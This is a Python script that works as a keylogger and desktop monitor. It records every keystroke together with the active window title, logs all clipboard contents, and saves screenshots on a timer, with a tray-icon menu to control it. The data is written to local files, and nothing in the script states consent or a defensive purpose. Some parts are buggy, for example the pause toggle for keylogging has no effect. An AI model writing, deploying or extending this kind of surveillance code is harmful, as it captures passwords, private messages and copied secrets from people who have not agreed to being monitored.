import os
import pyautogui
import time
import threading
import sys
from pynput import keyboard
from pystray import Icon, Menu, MenuItem
from PIL import Image, ImageDraw
import pygetwindow as gw
from datetime import datetime
import pyperclip

# Global variables
is_running = True
listener_running = True
screenshot_interval = 60  # Default interval (seconds)
screenshot_folder = "screenshots"
keylog_file = "key_log.txt"
clipboard_log_file = "clipboard_log.txt"
lock = threading.Lock()
current_line = ""
first_entry = True
active_window = ""
current_window = None  # Currently active window
current_keys = []  # Keys typed in the current window
last_clipboard_content = None  # To track clipboard changes

# Ensure the screenshots folder exists
os.makedirs(screenshot_folder, exist_ok=True)


# Get the active window's title
def get_active_window_title():
    try:
        window = gw.getActiveWindow()
        if window is not None:
            return window.title
        return "Unknown Application"
    except Exception as e:
        print(f"Error getting active window title: {e}")
        return "Unknown Application"


# Write a log entry to the file
def write_log_entry(window, keys, include_window_info=False):
    timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    with open(keylog_file, "a", encoding="utf-8") as log_file:
        if include_window_info:  # Log the window info only once per window change
            log_file.write(f"\n[{timestamp}] - Active Window: {window}\n")
            log_file.write("----------------\n")
        if keys:
            log_file.write(f"{timestamp}: {''.join(keys)}\n")
    print(f"Logged: {''.join(keys)}")  # Optional for debugging


# Take a screenshot
def take_screenshot():
    global screenshot_interval
    while True:
        if is_running:
            timestamp = time.strftime("%Y-%m-%d_%H-%M-%S")
            filename = os.path.join(screenshot_folder, f"screenshot_{timestamp}.png")
            pyautogui.screenshot(filename)
            print(f"Screenshot saved: {filename}")
        with lock:
            current_interval = screenshot_interval
        time.sleep(current_interval)


# Handle key press events
def on_press(key):
    global current_window, current_keys

    # Get the active window title
    active_window = get_active_window_title()

    # Detect window change
    if current_window != active_window:
        if current_window:
            # Log the previous window's data
            write_log_entry(current_window, current_keys)
        # Reset for the new window
        current_window = active_window
        current_keys = []
        write_log_entry(current_window, [], include_window_info=True)  # Log the new window info

    # Handle key input
    try:
        key_char = key.char  # For printable characters
    except AttributeError:
        key_char = f"[{key}]"  # For special keys (e.g., Enter, Backspace)

    # Record the key
    if key_char == "[Key.space]":
        current_keys.append(" ")
    elif key_char == "[Key.enter]":
        current_keys.append("\n")
    elif key_char not in ["[Key.shift]", "[Key.ctrl]", "[Key.alt]"]:  # Skip modifier keys
        current_keys.append(key_char)


# Handle key release events
def on_release(key):
    if key == keyboard.Key.esc:
        # On Esc key, finalize logging and stop the listener
        write_log_entry(current_window, current_keys)
        print("Keylogger stopped.")
        return False


# Start the keylogger
def start_keylogger():
    with open(keylog_file, "w", encoding="utf-8") as log_file:
        log_file.write("Keylogger started.\n")

    listener = keyboard.Listener(on_press=on_press, on_release=on_release)
    listener.start()
    listener.join()


# Monitor clipboard changes
def monitor_clipboard():
    global last_clipboard_content
    while True:
        try:
            current_clipboard_content = pyperclip.paste()
            if current_clipboard_content != last_clipboard_content:
                last_clipboard_content = current_clipboard_content
                timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
                with open(clipboard_log_file, "a", encoding="utf-8") as log_file:
                    log_file.write(f"{timestamp}: Copied: {current_clipboard_content}\n")
                print(f"Clipboard updated: {current_clipboard_content}")  # Optional for debugging
        except Exception as e:
            print(f"Error monitoring clipboard: {e}")
        time.sleep(1)  # Polling interval


# Toggle screenshot taking
def toggle_screenshots(icon, item):
    global is_running
    is_running = not is_running


# Toggle keylogging
def toggle_keylogging(icon, item):
    global listener_running
    listener_running = not listener_running


# Update screenshot interval
def set_interval(icon, item):
    global screenshot_interval
    with lock:
        screenshot_interval = int(item.text.split()[0])
    update_checkmarks(icon)
    icon.notify(f"Screenshot interval set to {screenshot_interval} seconds.")


# Stop script
def stop_script(icon, item):
    global listener
    icon.stop()
    listener.stop()
    print("Script stopped.")
    exit(0)


# Restart script
def restart_script(icon, item):
    global listener
    icon.stop()
    listener.stop()
    print("Restarting script...")
    os.execv(sys.executable, ['python'] + sys.argv)


# Update checkmarks dynamically
def update_checkmarks(icon):
    interval_menu = Menu(
        MenuItem("30 seconds", set_interval, checked=lambda item: screenshot_interval == 30),
        MenuItem("60 seconds", set_interval, checked=lambda item: screenshot_interval == 60),
        MenuItem("120 seconds", set_interval, checked=lambda item: screenshot_interval == 120),
        MenuItem("300 seconds", set_interval, checked=lambda item: screenshot_interval == 300),
    )

    menu = Menu(
        MenuItem("Pause/Resume Screenshots", toggle_screenshots, checked=lambda item: is_running),
        MenuItem("Pause/Resume Keylogging", toggle_keylogging, checked=lambda item: listener_running),
        MenuItem("Set Screenshot Interval", interval_menu),
        MenuItem("Restart", restart_script),
        MenuItem("Exit", stop_script),
    )

    icon.menu = menu


# Create tray icon
def create_tray_icon():
    icon_image = Image.new("RGB", (64, 64), color=(255, 255, 255))
    draw = ImageDraw.Draw(icon_image)
    draw.ellipse((16, 16, 48, 48), fill=(0, 0, 255))

    icon = Icon("Screenshot Logger", icon_image, "Screenshot Logger")
    update_checkmarks(icon)
    icon.run()


# Start clipboard monitoring thread
clipboard_thread = threading.Thread(target=monitor_clipboard)
clipboard_thread.daemon = True
clipboard_thread.start()

# Start screenshot thread
screenshot_thread = threading.Thread(target=take_screenshot)
screenshot_thread.daemon = True
screenshot_thread.start()

# Start keylogger
start_keylogger()

# Start tray icon
create_tray_icon()
